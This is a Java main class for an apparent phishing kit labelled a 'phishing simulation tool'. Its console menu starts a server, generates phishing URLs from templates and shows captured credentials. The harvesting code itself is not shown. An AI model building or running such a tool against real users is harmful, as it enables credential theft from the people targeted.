package org.guercifzone;



import com.ngrok.Session;
import org.guercifzone.DeepSeek.CredentialLogger;
import org.guercifzone.DeepSeek.TemplateManager;
import org.guercifzone.DeepSeek.UrlGenerator;
import org.guercifzone.DeepSeek.WebServer;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.util.Scanner;


public class Main {
    public static void main( String[] args)  {
       System.out.println("""
               ############################################
               #  phishing simulation tools (java EditionP#
               #                guercifzone               #
               ############################################
               """);
        Scanner scanner = new Scanner(System.in);
        WebServer Server = new WebServer();
        while (true){
            System.out.println("\nOption:");
            System.out.println("1. Start Server");
            System.out.println("2. Generate Phishing Url");
            System.out.println("3. View Captured Credentials");
            System.out.println("4. Exite");
            System.out.print("Select Option");

            String choice = scanner.nextLine();
            switch (choice){
                case "1":
                    Server.start();
                    break;
                case "2":
                    System.out.println("\nAvailable Templates:");
                    TemplateManager.listTemplates();
                    System.out.print("Enter template name: ");
                    String template = scanner.nextLine();
                    String url = UrlGenerator.generateUrl(template);
                    System.out.println("Generated URL: " + url);
                    break;
                case "3":
                    CredentialLogger.viewLogs();
                    break;
                case "4":
                    Server.stop();
                    System.out.println("Exiting...");
                    System.exit(0);
                    break;
                default:
                    System.out.println("Invalid option!");
            }

        }
    }
}